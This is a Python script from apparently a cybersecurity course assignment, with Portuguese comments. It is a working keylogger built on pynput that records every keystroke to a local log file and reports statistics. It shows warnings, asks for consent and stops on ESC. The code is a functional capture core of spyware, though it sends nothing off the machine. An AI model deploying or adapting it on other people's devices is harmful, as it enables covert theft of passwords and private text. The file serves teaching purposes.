#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Keylogger Simulado - FINS EDUCACIONAIS
=======================================

Desenvolvido por: Hevellyn
Curso: DIO - Ciberseguran√ßa
Data: Novembro/2025

IMPORTANTE: Use s√≥ pra estudar! Nunca pra espionar ningu√©m.

Esse foi o script mais interessante de fazer. Usei a biblioteca pynput
pra capturar as teclas. No in√≠cio tive dificuldade com as teclas especiais,
mas depois consegui resolver.

Nota: A vers√£o com email foi mais complicada por causa da autentica√ß√£o do Gmail
"""

import os
import sys
from datetime import datetime
from pynput import keyboard
import threading
import time


class KeyloggerSimulado:
    """
    Classe que simula um keylogger educacional.
    
    Esta classe implementa funcionalidades b√°sicas de um keylogger:
    - Captura de teclas pressionadas
    - Registro em arquivo de log
    - Filtragem de teclas especiais
    - Timestamp das capturas
    """
    
    def __init__(self, arquivo_log="keylog.txt"):
        """
        Inicializa o keylogger simulado.
        
        Args:
            arquivo_log (str): Nome do arquivo onde as teclas ser√£o registradas
        """
        self.arquivo_log = arquivo_log
        self.teclas_capturadas = []
        self.executando = False
        self.listener = None
        self.tempo_inicio = None
        
        # Buffer para otimizar escrita em arquivo
        self.buffer = []
        self.tamanho_buffer = 10
        
    def on_press(self, tecla):
        """
        Callback chamado quando uma tecla √© pressionada.
        
        Args:
            tecla: Objeto de tecla do pynput
        """
        try:
            # Captura teclas alfanum√©ricas
            tecla_str = tecla.char
            self.registrar_tecla(tecla_str)
            
        except AttributeError:
            # Captura teclas especiais
            tecla_especial = self.processar_tecla_especial(tecla)
            if tecla_especial:
                self.registrar_tecla(tecla_especial)
    
    def processar_tecla_especial(self, tecla):
        """
        Processa teclas especiais e retorna representa√ß√£o leg√≠vel.
        
        Args:
            tecla: Objeto de tecla especial
            
        Returns:
            str: Representa√ß√£o da tecla especial ou None
        """
        teclas_mapeadas = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.ctrl: '[CTRL]',
            keyboard.Key.alt: '[ALT]',
            keyboard.Key.caps_lock: '[CAPS_LOCK]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.delete: '[DELETE]',
            keyboard.Key.home: '[HOME]',
            keyboard.Key.end: '[END]',
            keyboard.Key.page_up: '[PAGE_UP]',
            keyboard.Key.page_down: '[PAGE_DOWN]',
        }
        
        return teclas_mapeadas.get(tecla, None)
    
    def registrar_tecla(self, tecla):
        """
        Registra uma tecla capturada no buffer e arquivo.
        
        Args:
            tecla (str): Tecla a ser registrada
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Adiciona ao buffer
        self.buffer.append(tecla)
        self.teclas_capturadas.append({
            'tecla': tecla,
            'timestamp': timestamp
        })
        
        # Escreve no arquivo quando o buffer est√° cheio
        if len(self.buffer) >= self.tamanho_buffer:
            self.salvar_buffer()
    
    def salvar_buffer(self):
        """
        Salva o conte√∫do do buffer no arquivo de log.
        """
        if not self.buffer:
            return
        
        try:
            with open(self.arquivo_log, 'a', encoding='utf-8') as f:
                f.write(''.join(self.buffer))
            
            self.buffer.clear()
            
        except Exception as e:
            print(f"[!] Erro ao salvar log: {str(e)}")
    
    def iniciar(self):
        """
        Inicia a captura de teclas.
        """
        if self.executando:
            print("[!] Keylogger j√° est√° em execu√ß√£o!")
            return
        
        self.executando = True
        self.tempo_inicio = datetime.now()
        
        # Cria cabe√ßalho no arquivo de log
        with open(self.arquivo_log, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Sess√£o iniciada em: {self.tempo_inicio.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n")
        
        print(f"[+] Keylogger iniciado!")
        print(f"[*] Capturando teclas...")
        print(f"[*] Log sendo salvo em: {self.arquivo_log}")
        print(f"[*] Pressione ESC para parar\n")
        
        # Inicia o listener em thread separada
        self.listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        self.listener.start()
    
    def on_release(self, tecla):
        """
        Callback chamado quando uma tecla √© solta.
        Para o keylogger quando ESC √© pressionado.
        
        Args:
            tecla: Objeto de tecla do pynput
            
        Returns:
            bool: False para parar o listener, True para continuar
        """
        if tecla == keyboard.Key.esc:
            return False
        return True
    
    def parar(self):
        """
        Para a captura de teclas e salva dados finais.
        """
        if not self.executando:
            return
        
        self.executando = False
        
        # Salva buffer restante
        self.salvar_buffer()
        
        # Adiciona rodap√© no arquivo de log
        tempo_fim = datetime.now()
        duracao = tempo_fim - self.tempo_inicio
        
        with open(self.arquivo_log, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Sess√£o encerrada em: {tempo_fim.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Dura√ß√£o: {duracao}\n")
            f.write(f"Total de teclas capturadas: {len(self.teclas_capturadas)}\n")
            f.write(f"{'='*60}\n\n")
        
        print(f"\n[+] Keylogger parado!")
        print(f"[*] Total de teclas capturadas: {len(self.teclas_capturadas)}")
        print(f"[*] Dura√ß√£o: {duracao}")
        print(f"[*] Log salvo em: {self.arquivo_log}")
    
    def aguardar(self):
        """
        Aguarda o listener terminar (quando ESC √© pressionado).
        """
        if self.listener:
            self.listener.join()
            self.parar()
    
    def gerar_relatorio(self):
        """
        Gera um relat√≥rio estat√≠stico das teclas capturadas.
        """
        if not self.teclas_capturadas:
            print("[!] Nenhuma tecla foi capturada ainda!")
            return
        
        print("\n" + "="*60)
        print("  RELAT√ìRIO DE CAPTURA")
        print("="*60)
        
        # Estat√≠sticas b√°sicas
        total_teclas = len(self.teclas_capturadas)
        tempo_decorrido = datetime.now() - self.tempo_inicio if self.tempo_inicio else None
        
        print(f"\nTotal de teclas capturadas: {total_teclas}")
        if tempo_decorrido:
            print(f"Tempo de captura: {tempo_decorrido}")
            teclas_por_minuto = total_teclas / (tempo_decorrido.total_seconds() / 60)
            print(f"M√©dia de teclas por minuto: {teclas_por_minuto:.2f}")
        
        # Frequ√™ncia de teclas
        frequencia = {}
        for item in self.teclas_capturadas:
            tecla = item['tecla']
            if tecla in frequencia:
                frequencia[tecla] += 1
            else:
                frequencia[tecla] = 1
        
        print(f"\nTeclas √∫nicas capturadas: {len(frequencia)}")
        
        # Top 10 teclas mais pressionadas
        top_teclas = sorted(frequencia.items(), key=lambda x: x[1], reverse=True)[:10]
        
        if top_teclas:
            print("\nTop 10 teclas mais pressionadas:")
            for i, (tecla, count) in enumerate(top_teclas, 1):
                tecla_exibida = tecla if len(tecla) == 1 else tecla[:20]
                print(f"  {i}. '{tecla_exibida}': {count} vezes")
        
        print("\n" + "="*60 + "\n")


def main():
    """
    Fun√ß√£o principal do keylogger simulado.
    """
    print("\n" + "=" * 60)
    print("  KEYLOGGER SIMULADO - APENAS PARA FINS EDUCACIONAIS")
    print("=" * 60)
    print("\n‚ö†Ô∏è  AVISO: Este script √© apenas para fins educacionais!")
    print("    Execute apenas em ambientes de teste controlados.")
    print("    Nunca use para espionar pessoas sem consentimento!\n")
    
    # Pergunta ao usu√°rio se deseja continuar
    resposta = input("Deseja continuar com a simula√ß√£o? (sim/n√£o): ").lower()
    
    if resposta not in ['sim', 's', 'yes', 'y']:
        print("\n[*] Opera√ß√£o cancelada pelo usu√°rio.")
        sys.exit(0)
    
    # Nome do arquivo de log
    arquivo_log = input("\nNome do arquivo de log [keylog.txt]: ").strip()
    if not arquivo_log:
        arquivo_log = "keylog.txt"
    
    print("\n" + "="*60)
    print("  INSTRU√á√ïES")
    print("="*60)
    print("\n1. O keylogger come√ßar√° a capturar teclas ap√≥s iniciar")
    print("2. Digite algo para testar a captura")
    print("3. Pressione ESC para parar o keylogger")
    print("4. Um relat√≥rio ser√° gerado ao final\n")
    
    input("Pressione ENTER para iniciar...")
    
    # Inicializa e inicia o keylogger
    keylogger = KeyloggerSimulado(arquivo_log)
    
    try:
        keylogger.iniciar()
        keylogger.aguardar()
        
        # Gera relat√≥rio final
        keylogger.gerar_relatorio()
        
        print("\n" + "="*60)
        print("  SIMULA√á√ÉO CONCLU√çDA")
        print("="*60)
        print("\nüìö Pr√≥ximos passos:")
        print(f"   1. Examine o arquivo '{arquivo_log}'")
        print("   2. Revise as teclas capturadas")
        print("   3. Estude a documenta√ß√£o sobre preven√ß√£o")
        print("\n")
        
    except KeyboardInterrupt:
        print("\n\n[!] Interrompido pelo usu√°rio (Ctrl+C)")
        keylogger.parar()
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Erro: {str(e)}")
        keylogger.parar()
        sys.exit(1)


if __name__ == "__main__":
    main()
